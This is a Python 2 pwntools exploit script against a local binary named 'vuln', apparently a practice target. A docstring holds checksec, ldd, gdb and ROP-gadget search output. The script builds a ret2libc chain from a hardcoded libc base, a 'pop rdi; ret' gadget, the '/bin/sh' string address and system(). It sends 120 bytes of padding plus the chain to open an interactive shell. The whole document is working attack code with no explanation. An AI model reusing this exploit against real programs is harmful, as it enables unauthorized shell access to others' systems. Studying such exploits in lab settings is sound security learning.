#!/usr/bin/env python2.7
# coding: UTF-8


'''
$ checksec.sh --file ./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    Not an ELF file   No RPATH   No RUNPATH   ./vuln

$ ldd vuln
    linux-vdso.so.1 =>  (0x00007ffff7ffd000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c14000)
    /lib64/ld-linux-x86-64.so.2 (0x0000555555554000)

(gdb) info proc mapping
process 3676
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x7ffff7a14000     0x7ffff7bcf000   0x1bb000        0x0 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7bcf000     0x7ffff7dcf000   0x200000   0x1bb000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7dcf000     0x7ffff7dd3000     0x4000   0x1bb000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7dd3000     0x7ffff7dd5000     0x2000   0x1bf000 /lib/x86_64-linux-gnu/libc-2.19.so

(gdb) x/4x $rbp
0x7fffffffe0c0: 0x00000000  0x00000000  0xf7a35ec5  0x00007fff

$ $ rp --file=/lib/x86_64-linux-gnu/libc.so.6 --rop=1 | grep 'pop rdi ; ret'| less
0x00022a0a: pop rdi ; ret  ;  (1 found) # doesn't work
0x00022a21: pop rdi ; ret  ;  (1 found)
0x00022a4a: pop rdi ; ret  ;  (1 found)
0x00022a72: pop rdi ; ret  ;  (1 found)
'''

from pwn import *

context.log_level = 'debug'

r = process('./vuln')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

libc_base = 0x7ffff7a14000

libc_system_offset = libc.symbols['system']
print 'libc_system_offset: {0}'.format(hex(libc_system_offset))

libc_system = libc_base + libc_system_offset
print 'libc_system:        {0}'.format(hex(libc_system))

binsh_offset = next(libc.search('/bin/sh\0'))
print 'binsh_offset:       {0}'.format(hex(binsh_offset))

binsh_addr = libc_base + binsh_offset
print 'binsh_addr:         {0}'.format(hex(binsh_addr))

rdi_gadget_offset = 0x00022a4a
print 'rdi_gadget_offset:  {0}'.format(hex(rdi_gadget_offset))

rdi_gadget_addr = libc_base + rdi_gadget_offset
print 'rdi_gadget_addr:    {0}'.format(hex(rdi_gadget_addr))

payload = 'a'*120
payload += p64(rdi_gadget_addr)
payload += p64(binsh_addr)
payload += p64(libc_system)

r.sendline(payload)
r.interactive()
